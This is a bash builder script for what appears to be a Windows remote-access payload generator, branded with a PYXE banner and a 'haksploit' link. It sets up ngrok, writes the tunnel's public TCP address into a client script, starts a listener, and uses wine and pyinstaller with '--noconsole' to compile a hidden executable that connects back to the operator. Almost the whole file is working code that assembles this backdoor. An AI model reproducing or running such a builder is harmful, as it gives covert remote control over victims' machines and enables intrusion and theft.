#!/bin/bash
echo $'\e[32;1m '
echo "'########::'##:::'##:'##::::'##:'########:
 ##.... ##:. ##:'##::. ##::'##:: ##.....::
 ##:::: ##::. ####::::. ##'##::: ##:::::::
 ########::::. ##::::::. ###:::: ######:::
 ##.....:::::: ##:::::: ## ##::: ##...::::
 ##::::::::::: ##::::: ##:. ##:: ##:::::::
 ##::::::::::: ##:::: ##:::. ##: ########:
..::::::::::::..:::::..:::::..::........::    
"
echo $'\e[32;1m \e[0m'
[ -f config.txt ] && old="old" || old="New"
if test "$old" = "New"
then
    pys=`dpkg -s python2.7 | grep "Status:"`
    if [[ $pys = *"ok installed"* ]]; then
        echo  $'\e[32;1mpython2.7 \e[0m:[\e[32m ok Installed\e[0m]'
    else 
        echo  $'\e[32;1mpython2.7 \e[0m:[\e[32m Not Installed\e[0m]'
        read -p  "Install python2.7 (Y/n)" pop
        if test "$pop" = "Y"
        then
            apt-get install python2.7 
        else
            echo $'\e[31;1mPython 2.7 must be installed to run this tool\e[0m'
            exit 1
        fi
    fi
        pys=`dpkg -s curl | grep "Status:"`
    if [[ $pys = *"ok installed"* ]]; then
        echo  $'\e[32;1mcurl      \e[0m:[\e[32m ok Installed\e[0m]'
    else 
        echo  $'\e[32;1mcurl      \e[0m:[\e[32m Not Installed\e[0m]'
        read -p  "Install curl (Y/n)" pop
        if test "$pop" = "Y"
        then
            apt-get install curl 
        else
            echo $'\e[31;1mCurl must be installed to run this tool\e[0m'
            exit 1
        fi
    fi
    wis=`dpkg -s wine32 | grep "Status:"`
    if [[ $wis = *"ok installed"* ]]; then
       echo  $'\e[32;1mwine32 \e[0m   :[\e[32m ok Installed\e[0m]'
    else 
       echo  $'\e[32;1mwine32 \e[0m   :[\e[32m Not Installed\e[0m]'
       read -p  "Install wine32(Y/n)" wop
       if test "$wop" = "Y"
       then
           apt-get install wine32 
           read -p  "Install Pyinstaller to wine32(Y/n)" wpop
           if test "$pop" = "Y"
            then
               xterm -e ./cmds.sh &
               echo $'\e[32;1mInstalling pyinstaller in wine32\e[0m'
            else
               echo $'\e[31;1mPyinstaller must be installed \e[0m'
               exit 1
            fi
           else
           echo $'\e[31;1mwine32 must be installed to run this tool \e[0m'
           exit 1
       fi
    fi
    
   
    #install pyinstaller in wine
    #cd ~/.wine/drive_c/Python27
    #wine python.exe Scripts/pip.exe install pyinstaller
    sleep 2
    echo " "  
    echo $'\e[31;1mVisit https://haksploit.blogspot.in\e[0m'
    echo $'\e[33;1m****Go to the ngrok.com Signup and Login to get your TOKEN****\e[0m'
    echo $'\e[35;1m________________Rooster________________\e[0m'
    echo $'\e[31;1mhttps://dashboard.ngrok.com/user/signup\e[0m'
    echo " "  
    read -p $'\e[33;1m _/\_ Please Enter Your TOKEN _/\_ :\e[0m' tok 
    sleep 1
    {
    ./ngrok authtoken $tok
    } &> /dev/null
    echo $tok >> config.txt
    read -p $'\e[31;1mChange your ngrok token(y/N)? : \e[0m' op
    if test "$op" = "y"
    then
       read -p $ '\e[33;1m _/\_ Please Enter Your TOKEN _/\_ :\e[0m' ctoken
       {
        ./ngrok authtoken $ctoken
       } &> /dev/null
    fi
     #clearupfiles
    cd mstr 
    cp * ..
    cd ..
    clear
echo $'\e[31;1m '
    echo "'########::'##:::'##:'##::::'##:'########:
 ##.... ##:. ##:'##::. ##::'##:: ##.....::
 ##:::: ##::. ####::::. ##'##::: ##:::::::
 ########::::. ##::::::. ###:::: ######:::
 ##.....:::::: ##:::::: ## ##::: ##...::::
 ##::::::::::: ##::::: ##:. ##:: ##:::::::
 ##::::::::::: ##:::: ##:::. ##: ########:
..::::::::::::..:::::..:::::..::........::    
"
	echo $'\e[31;1m \e[0m'
    #cleanenv
    read -p $'\e[33;1mEnter L_PORT To Receive Incoming Connection: eg(8080)\e[0m' port
    sed -i 's/yoy/'$port'/g' servertcp.py
    gnome-terminal -- ./ngrok tcp $port &
    sleep 5
    {
    var=$(curl http://localhost:4040/inspect/http | grep -Eo '(tcp)://[^/"]+')
    } &> /dev/null
    A="$(cut -d':' -f2 <<<"$var")"
    B="$(cut -d':' -f3 <<<"$var")"
    tcpa="$(cut -d'/' -f3 <<<"$A")"
    po="$(cut -d'\' -f1 <<<"$B")"
    gnome-terminal -- python servertcp.py $port &
    sleep 2
    st='"'
    tcpa="$st$tcpa$st"
    sed -i 's/xox/'$tcpa'/g' clienttcp.py
    sed -i 's/yoy/'$po'/g' clienttcp.py
    sleep 1
    gnome-terminal -- wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile --noconsole clienttcp.py &
    echo -ne $'\e[31;1mProcessing ###                     (5%)\r\e[0m'
    sleep 1
    echo -ne $'\e[31;1mProcessing ######                  (15%)\r\e[0m'
    sleep 2
    echo -ne $'\e[31;1mProcessing ##########              (40%)\r\e[0m'
    sleep 1
    echo -ne $'\e[31;1mProcessing ###############         (65%)\r\e[0m'
    sleep 1
    echo -ne $'\e[31;1mProcessing ##################      (85%)\r\e[0m'
    sleep 2
    echo -ne $'\e[31;1mProcessing ####################### (100%)\r\e[0m'
    echo -ne '\n'
    echo $'\e[32;1mGo to /dist/clienttcp.exe ......\e[0m'
    exit 1
    else
    read -p $'\e[31;1mChange your ngrok token(y/N)? : \e[0m' op
    if test "$op" = "y"
    then
       read -p $ '\e[33;1m _/\_ Please Enter Your TOKEN _/\_ :\e[0m' ctoken
       {
        ./ngrok authtoken $ctoken
       } &> /dev/null
    fi
     #clearupfiles
    cd mstr 
    cp * ..
    cd ..
    clear
echo $'\e[31;1m '
    echo "'########::'##:::'##:'##::::'##:'########:
 ##.... ##:. ##:'##::. ##::'##:: ##.....::
 ##:::: ##::. ####::::. ##'##::: ##:::::::
 ########::::. ##::::::. ###:::: ######:::
 ##.....:::::: ##:::::: ## ##::: ##...::::
 ##::::::::::: ##::::: ##:. ##:: ##:::::::
 ##::::::::::: ##:::: ##:::. ##: ########:
..::::::::::::..:::::..:::::..::........::    
"
	echo $'\e[31;1m \e[0m'
    #cleanenv
    read -p $'\e[33;1mEnter L_PORT To Receive Incoming Connection: \e[0m' port
    sed -i 's/yoy/'$port'/g' servertcp.py
    gnome-terminal -- ./ngrok tcp $port &
    sleep 5
    {
    var=$(curl http://localhost:4040/inspect/http | grep -Eo '(tcp)://[^/"]+')
    } &> /dev/null
    A="$(cut -d':' -f2 <<<"$var")"
    B="$(cut -d':' -f3 <<<"$var")"
    tcpa="$(cut -d'/' -f3 <<<"$A")"
    po="$(cut -d'\' -f1 <<<"$B")"
    gnome-terminal -- python servertcp.py $port &
    sleep 2
    st='"'
    tcpa="$st$tcpa$st"
    sed -i 's/xox/'$tcpa'/g' clienttcp.py
    sed -i 's/yoy/'$po'/g' clienttcp.py
    sleep 1
    gnome-terminal -- wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile --noconsole clienttcp.py &
    echo -ne $'\e[31;1mProcessing ###                     (5%)\r\e[0m'
    sleep 1
    echo -ne $'\e[31;1mProcessing ######                  (15%)\r\e[0m'
    sleep 2
    echo -ne $'\e[31;1mProcessing ##########              (40%)\r\e[0m'
    sleep 1
    echo -ne $'\e[31;1mProcessing ###############         (65%)\r\e[0m'
    sleep 1
    echo -ne $'\e[31;1mProcessing ##################      (85%)\r\e[0m'
    sleep 2
    echo -ne $'\e[31;1mProcessing ####################### (100%)\r\e[0m'
    echo -ne '\n'
    echo $'\e[32;1mGo to /dist/clienttcp.exe ......\e[0m'
    exit 1
fi
